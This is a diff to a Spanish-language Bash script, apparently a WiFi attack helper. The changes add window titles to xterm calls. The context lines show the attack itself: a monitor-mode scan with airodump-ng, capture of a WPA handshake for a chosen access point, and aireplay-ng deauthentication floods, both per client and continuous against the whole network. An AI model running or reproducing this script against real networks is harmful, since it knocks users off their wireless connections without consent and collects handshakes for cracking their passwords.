@@ -92,7 +92,7 @@ sleep 2
 
 clear 
 lan=$(networkctl 2>/dev/null | grep "mon" | awk '{print $(NF-3)}')
-xterm -hold -e "airodump-ng $lan -w redes"
+xterm -hold -title "Redes Wifi" -e "airodump-ng $lan -w redes"
 echo -e "\n${WHITE}[+] ${GREEN}Redes wifi encontradas, seleccione una${END}\n"
 eleccion=$(awk -F',' '{print $14}' redes-01.csv | sed 's/ESSID//' | tr -s '\n' | sort | sed '/^\s*$/d' | sed 's/ //' | sed 's/ /\//g')
 
@@ -110,7 +110,7 @@ select ataque in $opt;do
 
 	if [[ $ataque == "Obtener_handshake" ]];then
 
-		xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
+		xterm -hold -title "Capturando Paquetes" -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
 		rm redes*
 
 		echo -e "\n${WHITE}[!] ${GREEN}Una vez obtenido el handshake revise la carpeta 'capturas'${END}"
@@ -121,7 +121,7 @@ select ataque in $opt;do
 		    if [ -s mac_users.txt ];then
 		        awk -F',' '{print $1}' captura-01.csv | tail -n+6 | sort | sed '/^\s*$/d' > mac_users.txt
 		        for i in $(cat mac_users.txt);do 
-		            xterm -hold -e "aireplay-ng -0 4 -a $bssid -c $i $lan" &
+		            xterm -hold -title "Desautenticando" -e "aireplay-ng -0 4 -a $bssid -c $i $lan" &
 		            sleep 4
 		            pid=$(pidof xterm | awk '{print $1}') &>/dev/null
 		            kill -9 $pid &>/dev/null
@@ -130,8 +130,8 @@ select ataque in $opt;do
 		done 2>/dev/null
 		
 	else
-		xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
-		xterm -hold -e "aireplay-ng -0 0 -a $bssid $lan" &
+		xterm -hold -title "Redes Wifi" -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
+		xterm -hold -title "Desautenticando" -e "aireplay-ng -0 0 -a $bssid $lan" &
 		rm redes*
 		echo
 		while true;do
